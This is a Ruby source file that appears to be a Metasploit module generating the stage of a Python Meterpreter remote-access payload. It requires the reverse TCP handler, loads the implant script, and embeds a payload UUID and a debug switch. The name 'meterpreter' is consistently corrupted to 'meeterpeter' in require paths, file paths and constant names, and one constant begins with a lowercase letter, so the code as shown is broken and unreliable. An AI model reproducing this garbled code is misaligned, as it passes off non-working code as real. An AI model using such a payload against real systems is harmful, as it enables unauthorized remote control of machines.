##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meeterpeter_python'
require 'msf/base/sessions/meeterpeter_options'

module Metasploit3
  include Msf::Sessions::meeterpeterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python meeterpeter',
      'Description'   => 'Run a meeterpeter server in Python (2.5-2.7 & 3.1-3.4)',
      'Author'        => 'Spencer McIntyre',
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::meeterpeter_Python_Python
    ))
    register_advanced_options([
      OptBool.new('PythonmeeterpeterDebug', [ true, "Enable debugging for the Python meeterpeter", false ])
    ], self.class)
  end

  def generate_stage(opts={})
    file = ::File.join(Msf::Config.data_directory, "meeterpeter", "meeterpeter.py")

    met = ::File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }

    if datastore['PythonmeeterpeterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    uuid = opts[:uuid] || generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("PAYLOAD_UUID = \"\"", "PAYLOAD_UUID = \"#{bytes}\"")

    met
  end
end
